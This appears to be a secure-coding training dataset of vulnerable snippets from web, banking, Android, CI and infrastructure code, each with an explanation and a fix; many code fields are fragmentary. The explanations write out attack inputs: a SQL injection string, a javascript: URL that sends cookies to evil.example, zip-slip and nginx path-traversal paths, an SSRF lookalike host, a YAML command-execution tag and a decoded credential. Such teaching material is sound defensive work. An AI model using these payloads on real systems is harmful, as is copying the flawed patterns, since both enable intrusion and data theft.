snippets.title: Nightly carry-over report
snippets.context: A results portal job runs every night and emails each head of department (HOD) the students who failed a course. HODs can rename their department on a settings page, and that update uses a parameterised query.
code: // Nightly job: email each head of department their carry-over list.
const { rows: depts } = await db.query('SELECT id, name, hod_email FROM departments');
snippets.explanation: This is second order SQL injection. The department name went into the database safely, so it feels trusted when it comes back out, but the job pastes it into SQL. An HOD who renames their department to  x' UNION SELECT username, password_hash FROM staff --  gets every staff password hash emailed to them that night, sent by the job itself with its database privileges. Data from your own database is still user input if a user wrote it.

fix.summary: Bind every value as a parameter, including values you read from your own tables. Here, filter by the department ID instead of the name.
code: // Nightly job: email each head of department their carry-over list.
const { rows: depts } = await db.query('SELECT id, name, hod_email FROM departments');

snippets.author: Th3 SpaceIO

lineNotes.3: The department list comes from your own table, which feels trusted, but whoever can name a department controls that text.

snippets.title: Lecturer profile page
snippets.context: Students open a lecturer's profile on the school portal to read their bio and visit their website. Lecturers edit their own profile.
code: $stmt = $pdo->prepare('SELECT title, full_name, bio, website FROM lecturers WHERE id = ?');
snippets.explanation: Every value is escaped, so no tag can be injected. But escaping protects the HTML, not what a URL means. A website saved as  javascript:fetch('https://evil.example/?c='+document.cookie)  contains no < or quote to escape, and it runs on the portal's own origin the moment a student clicks the link. A compromised lecturer account becomes a way into every student account that visits the profile.

fix.summary: Allow only http and https URLs, both when the profile is saved and when the link is printed. Escaping is still needed on top of the scheme check.
code: $stmt = $pdo->prepare('SELECT title, full_name, bio, website FROM lecturers WHERE id = ?');

snippets.author: Th3 SpaceIO

lineNotes.8: This escape function is correct for HTML. The trouble is that a link can be dangerous without any HTML characters.
lineNotes.12: The bio is escaped before the line breaks are added. That's safe.

snippets.title: Account statement download
snippets.context: Customers of a digital bank download monthly statements. The URL names the account and the statement, for example /api/accounts/88/statements/1204.
code: from flask import Flask, g, abort, send_file
from auth import login_required  # sets g.user
from models import db, Account, Statement
snippets.explanation: The ownership check is real, but it checks the wrong object. It proves account 88 belongs to the caller, then loads statement 1204 by its ID alone. Keep your own account ID in the URL and count through statement IDs, and you download other customers' statements, with their balances, transfers and who they paid. When a URL names a parent and a child, the child has to be fetched through the parent.

fix.summary: Load the statement with both IDs, so it's only found when it belongs to the account the caller owns.
code: from flask import Flask, g, abort, send_file
from auth import login_required  # sets g.user
from models import db, Account, Statement

snippets.author: Th3 SpaceIO

lineNotes.11: This check is right: the account must belong to you. But the statement is then loaded without checking it belongs to that account.

snippets.title: BVN lookup client
snippets.context: During account opening, a digital bank checks a customer's BVN through an identity verification partner. Each lookup is billed and returns personal data.
code: // BVN lookup during account opening, through our identity verification partner.
snippets.explanation: It doesn't look like a password, but a Basic auth header is just username:password in Base64, and Base64 is an encoding anyone can reverse with one command. This one decodes to th3bank-live:Kx9vLagos2026Bvn, the live login for the BVN partner. Anyone who can read the repo can run BVN lookups on your account, which costs you money and exposes customers' names, birth dates and phone numbers.

fix.summary: Load the partner credentials from the environment or a secrets manager, build the header at runtime, fail fast if they're missing, and rotate the credential that was committed.
code: // BVN lookup during account opening, through our identity verification partner.
throw new RuntimeException('KYC credentials are not configured');

snippets.author: Th3 SpaceIO

lineNotes.8: Checking the BVN is 11 digits keeps the URL safe.
lineNotes.13: Sending the credential in a header is normal. The problem is where it comes from.

snippets.title: Staff password hashing
snippets.context: The password module for staff accounts on a POS agent network's back office. It uses PBKDF2 with a random salt and stores the settings alongside each hash.
code: def verify_password(password: str, stored: str) -> bool:
snippets.explanation: The right algorithm with the wrong setting. PBKDF2 is only slow because it repeats the hash many times, and 1,000 rounds is hundreds of times fewer than current guidance. OWASP recommends at least 600,000 for PBKDF2-HMAC-SHA256, so a leaked table can be cracked roughly 600 times faster than it should be. Salt, constant time comparison and the stored format are all fine.

fix.summary: Raise the iteration count to at least 600,000 (or move to Argon2id or scrypt). Because the count is stored with each hash, old hashes still verify; rehash them at the next successful login.
code: def verify_password(password: str, stored: str) -> bool:

snippets.author: Th3 SpaceIO

lineNotes.9: A random 16-byte salt for each password is right.

snippets.title: Passport photo zip import
snippets.context: Schools upload one zip of student passport photos for ID card printing. Each school's photos go into its own folder.
code: // Schools upload one zip of student passport photos for ID card printing.
snippets.explanation: This is "zip slip". Names inside a zip file are just text chosen by whoever built it, and they can contain ../. An entry called ../14/20-0045.jpg passes the extension check and path.join walks it out of this school's folder and into another school's, swapping the photo on someone else's ID card. Deeper ../ chains reach any folder the app can write to, such as a public web folder.

fix.summary: Resolve each entry's path and check it still sits inside the output folder, or keep only the base file name so the zip's folders are ignored.
code: // Schools upload one zip of student passport photos for ID card printing.
throw new Error(`Unsafe path in zip: ${entry.entryName}`);

snippets.author: Th3 SpaceIO

lineNotes.11: The extension check doesn't look at folders in the name, so ../ still gets through below.
lineNotes.14: Writing the file is fine. The target path was built unsafely above.

snippets.title: Selfie check from the CDN
snippets.context: During account opening, the app uploads the customer's selfie to the bank's CDN, then sends the image URL to this endpoint for a face match against their BVN photo.
code: from flask import Flask, request, jsonify, g
from auth import login_required  # sets g.user
return jsonify(error="Upload the image to the CDN first"), 400
snippets.explanation: startswith compares text, not hosts. https://cdn.th3bank.example.ng.evil.example/x starts with the CDN string but is a domain the attacker owns, with a valid certificate. That server answers with a redirect, requests follows redirects by default, and the bank's server is now making requests to internal addresses such as http://169.254.169.254 or an admin API on 10.0.0.0/8. The attacker sees only the status, but status alone is enough to map and hit internal services.

fix.summary: Parse the URL and compare the exact scheme and hostname, reject user info and unexpected ports, and turn off redirects.
code: from flask import Flask, request, jsonify, g
from auth import login_required  # sets g.user
or parts.username or parts.password or parts.port not in (None, 443)):
return jsonify(error="Upload the image to the CDN first"), 400

snippets.author: Th3 SpaceIO

lineNotes.7: The CDN address itself is fine. It's how the link is compared with it.

snippets.title: Timetable import
snippets.context: School admins import the exam timetable from a YAML file. Departments often share these files in WhatsApp groups before the admin uploads one.
code: from flask import Flask, request, jsonify
if upload is None or not upload.filename.endswith((".yml", ".yaml")):
if not isinstance(data, dict) or "sessions" not in data:
return jsonify(error="Timetable must have a sessions list"), 422
snippets.explanation: Passing a Loader silences PyYAML's warning, so this looks deliberate and safe. But yaml.Loader is the full loader: it understands tags such as !!python/object/apply:os.system, which build Python objects and call functions while the file is being read. A timetable file passed around a department group with one extra line runs commands on the server the moment an admin imports it. The type check afterwards is too late.

fix.summary: Use yaml.safe_load, which only builds plain data: dicts, lists, strings, numbers, booleans and dates.
code: from flask import Flask, request, jsonify
if upload is None or not upload.filename.endswith((".yml", ".yaml")):
data = yaml.safe_load(upload.stream)  # plain data only, never objects
if not isinstance(data, dict) or "sessions" not in data:
return jsonify(error="Timetable must have a sessions list"), 422

snippets.author: Th3 SpaceIO

lineNotes.10: Only admins can upload, but an admin's file (or someone holding an admin's session) still shouldn't be able to run code.
lineNotes.13: Checking the file extension doesn't make the contents safe.

snippets.title: POS partial refund
snippets.context: POS agents can refund part of a card payment, for example when a customer returns some of the goods. The refund goes back to the customer's card.
code: // POS agents can refund part of a card payment, e.g. when goods are returned.
'SELECT id, agent_id, amount_kobo, status FROM transactions WHERE ref = $1 FOR UPDATE',
await t.none('INSERT INTO refunds (transaction_id, amount_kobo) VALUES ($1, $2)',
snippets.explanation: Each refund is checked on its own: a whole number, above zero, no more than the payment. Nothing checks what was already refunded. An agent working with a customer refunds a ₦10,000 payment ten times at ₦10,000 and ₦100,000 lands on the card. The row lock stops two refunds racing, but the rule it protects is incomplete. Validation has to cover the business rule, not just the shape of one number.

fix.summary: Inside the same locked transaction, add up the refunds already made and limit the new refund to what's left of the original payment.
code: // POS agents can refund part of a card payment, e.g. when goods are returned.
'SELECT id, agent_id, amount_kobo, status FROM transactions WHERE ref = $1 FOR UPDATE',
'SELECT COALESCE(SUM(amount_kobo), 0) AS done FROM refunds WHERE transaction_id = $1', [tx.id]);
return res.status(422).json({ error: 'Refund is more than what is left to refund' });
await t.none('INSERT INTO refunds (transaction_id, amount_kobo) VALUES ($1, $2)',

snippets.author: Th3 SpaceIO

lineNotes.9: The ownership and status checks are right.
lineNotes.15: Recording the refund is fine. The check before it only compares with the original amount, not with what has already been refunded.

snippets.title: Agent daily summary
snippets.context: The POS agent app shows a daily summary of transactions and commission. The mobile team added a header to help them debug failed requests.
code: // buildDailySummary validates the date and uses prepared statements
// Mobile team asked for this so they can debug from the app
echo json_encode(['error' => 'Could not load your summary', 'ref' => $ref]);
snippets.explanation: The body does everything right: a generic message and a reference ID, with the details logged on the server. The leak is in a response header, where most reviewers never look. Every failure now sends the exception class, the raw message (for a PDOException that includes SQL error text) and the server file path and line to anyone who triggers an error, in production and to every agent's phone.

fix.summary: Remove the header. Give the mobile team the reference ID instead and let them look it up in the server logs, or send detail only in a development build.
code: // buildDailySummary validates the date and uses prepared statements
header('X-Error-Ref: ' . $ref); // look this up in the server logs
echo json_encode(['error' => 'Could not load your summary', 'ref' => $ref]);

snippets.author: Th3 SpaceIO

lineNotes.12: Logging the full exception on the server with a reference is right.
lineNotes.17: The body is safe: a plain message and a reference.

snippets.title: Exporting a monthly statement
snippets.context: Customers download a PDF statement and share it with their bank or landlord. The FileProvider is configured for this folder.
code: val pdf = StatementPdf.render(statement)  // account number, balances, every transaction
snippets.explanation: The sharing part is done well: a FileProvider URI with a one-off read grant. But the file itself is written to the public Documents folder, shared storage that stays there after sharing and that other apps with storage or file access can read. Every statement the customer ever exported (account number, balance, every transaction) piles up there for any of them.

fix.summary: Write statements to the app's private storage and share them only through the FileProvider grant. Nothing lands in shared storage, and the files go when the app is uninstalled.
code: val pdf = StatementPdf.render(statement)  // account number, balances, every transaction
val dir = File(context.filesDir, "statements").apply { mkdirs() }  // private to the app

lineNotes.8: FileProvider is the right way to share a file. The problem is where the file was written.

snippets.title: Trusting the internal certificate authority
snippets.context: SparkPay's API uses certificates from the company's own internal CA, which phones don't trust by default. This client was written so the app can still connect.
code: client.badCertificateCallback = (X509Certificate cert, String host, int port) {
// Our CA isn't in the phone's trust store, so check the certificate is ours
snippets.explanation: The issuer is just text inside the certificate, chosen by whoever made it. An attacker on the network creates a self-signed certificate for api.sparkpay.example with the issuer name "SparkPay Internal CA", and this check accepts it. Nothing here proves the certificate was signed by the real CA's key.

fix.summary: Trust the internal CA itself instead of checking names. Load its certificate into the SecurityContext and remove badCertificateCallback, so the normal signature checks prove who signed the server's certificate.
code: // Trust only SparkPay's internal CA: its signature is checked on every connection
final client = HttpClient(context: context);  // no badCertificateCallback

lineNotes.4: Not trusting the phone's root certificates is fine if you then check your own certificate properly.
lineNotes.7: Checking the host is reasonable. It's the issuer check below that anyone can satisfy.

snippets.title: HTTP logging for the API client
snippets.context: Developers want full request logs while building features, and the team agreed release builds should log as little as possible.
code: // Full bodies only while developing; release builds keep it light
snippets.explanation: HEADERS isn't "light": it logs every request header in release builds, and the logging interceptor runs after the one that adds Authorization. Every API call writes the customer's bearer token to Logcat, where it can be read over USB debugging or swept up by tools that collect logs. Anyone holding that token is the customer until it expires.

fix.summary: Log nothing in release builds, and redact the Authorization header even in debug builds.

lineNotes.11: Adding the token to each request is right. The logging level decides whether it ends up in the logs.

snippets.context: Partner offers open in a WebView with an account bridge, so offer pages can show the customer's tier. Links to other sites should open in the browser.
code: override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
if (url.contains("sparkpay.example")) return false  // ours: stay in the app
snippets.explanation: contains() checks whether the text appears anywhere in the address, not who owns the site. https://sparkpay.example.attacker.example, https://attacker.example/?sparkpay.example and http://sparkpay.example (no TLS) all pass, so a partner's link can lead the WebView, and its SparkPay bridge, onto a page someone else controls.

fix.summary: Parse the address and compare the scheme and host exactly: https, and either sparkpay.example or a real subdomain of it.

snippets.title: Sharing transactions with the merchant app
snippets.context: SparkPay's separate Merchant app reads the customer's transactions through this content provider. A custom permission is meant to keep other apps out.
snippets.explanation: A normal permission is granted automatically, with no prompt, to any app that lists it in its own manifest. So the readPermission keeps nobody out: any app that asks for ng.sparkpay.permission.READ_TRANSACTIONS can read the customer's whole transaction history. The intent was to allow only SparkPay's own Merchant app.

fix.summary: Use protectionLevel="signature", so the permission is only granted to apps signed with the same key as SparkPay, which is exactly the Merchant app.

lineNotes.13: Requiring a permission is right. The question is which apps can get that permission.

snippets.title: Payout approvals by role
snippets.context: Customers have a profile document with their name and role. Only admins can see and approve payouts.
code: allow read: if request.auth != null && request.auth.uid == uid;
allow create: if request.auth.uid == uid && request.resource.data.role == 'customer';
allow update: if request.auth != null && request.auth.uid == uid;
allow read, write: if request.auth != null && isAdmin();
snippets.explanation: Creating a profile is locked to role 'customer', but updating it isn't: a user can update their own document with any fields, including role: 'admin'. One write from the browser console, and isAdmin() is true for them, so they can read and approve every payout.

fix.summary: Let users update their own profile but never change their role: require the new role to equal the stored one (or allow only named fields with diff().affectedKeys()).
code: allow read: if request.auth != null && request.auth.uid == uid;
allow create: if request.auth.uid == uid && request.resource.data.role == 'customer';
allow update: if request.auth != null && request.auth.uid == uid
allow read, write: if request.auth != null && isAdmin();

lineNotes.11: Create is safe: new users can only make themselves customers.
lineNotes.16: Payouts check the admin role correctly. The role itself is what can be changed.

snippets.title: Signing the Android release in CI
snippets.context: The release workflow decodes the app's signing keystore from a secret, builds the signed APK and uploads it as a build artifact for QA. The repository is public.
snippets.explanation: The artifact uploads the whole app folder, which now contains release.jks, the decoded signing keystore. On a public repository anyone signed in to GitHub can download artifacts. With the keystore (and a guess or leak of its password), someone can sign an update that phones accept as the real SparkPay app. GitHub hides secrets in logs, but it can't hide a file you upload.

fix.summary: Upload only the built APK, and delete the keystore as soon as the build finishes.

lineNotes.9: Restoring the keystore from a secret is the usual way. The problem is that the whole folder, keystore included, is uploaded afterwards.
lineNotes.12: Passing the password through env is normal.

snippets.title: Preview deploys for pull requests
snippets.context: Every pull request, including ones from forks, gets a preview site. The workflow needs the deploy token and permission to comment the preview link.
code: - run: npm ci && npm run build
snippets.explanation: pull_request_target runs with the base repository's secrets and a write token, which is safe only for trusted code. This workflow then checks out the pull request's own code and runs npm ci and the build scripts from it. Anyone can open a pull request from a fork whose package.json install script (or changed deploy script) reads the deploy token and sends it away.

fix.summary: Build untrusted pull requests with the plain pull_request event (no secrets), and let a separate workflow_run job deploy the uploaded build output with the token, without running any of the pull request's code.
code: - run: npm ci && npm run build
# A separate workflow_run job deploys this artifact with the token, running no PR code

lineNotes.7: Read-only contents permission limits the token, but the job still has the deploy token in its environment.
lineNotes.20: Passing the token through env is normal. The problem is that untrusted code runs in the same job.

snippets.title: Log shipper on every node
snippets.context: The log shipper reads container logs on each node and forwards them. Its security context was reviewed and tightened last quarter.
snippets.explanation: The security context is tight, but the container runtime's socket is mounted in. Whoever can talk to that socket can start new containers on the node with any settings: privileged, host file system mounted, anything. Since this is a DaemonSet, one bug in the shipper is root on every node in the cluster. Reading logs only needs the read-only /var/log/pods mount.

fix.summary: Remove the runtime socket. Keep the read-only log mount, and run as a non-root user.

lineNotes.19: Dropping all capabilities is good hardening, but the socket mount below undoes it.
lineNotes.21: Read-only access to pod logs is exactly what a log shipper needs.

snippets.title: Admin dashboard assets
snippets.context: Everything for the admin dashboard lives in /srv/admin: the built assets folder, plus the .env and config files the dashboard server reads.
snippets.explanation: The location has no trailing slash but the alias does. A request for /assets../.env matches "/assets", and nginx swaps that prefix for /srv/admin/assets/, giving /srv/admin/assets/../.env, which is /srv/admin/.env. The assets block also sits outside the single sign-on check, so anyone can fetch the dashboard's secrets. It's known as the off-by-slash mistake.

fix.summary: End the location with a slash to match the alias, so only paths inside the assets folder can be reached. (Keeping secrets outside the folder tree you serve from is a good second layer.)

lineNotes.10: Caching static files for 30 days is fine.
lineNotes.14: auth_request protects the app, but only for the paths this block handles.
